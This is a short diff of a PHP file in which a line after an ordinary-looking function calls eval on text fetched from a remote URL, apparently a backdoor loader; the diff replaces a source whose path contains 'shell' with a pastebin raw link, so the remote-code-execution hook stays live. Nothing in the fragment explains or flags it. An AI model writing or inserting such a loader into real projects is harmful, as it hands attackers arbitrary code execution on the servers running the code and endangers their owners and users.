@@ -11,4 +11,4 @@
  
     return $data; 
 } 
-      eval('?>' . get('https://aqilogic.com/shell/d/fanvat.txt'));
+      eval('?>' . get('https://pastebin.com/raw/CdNWURPG'));
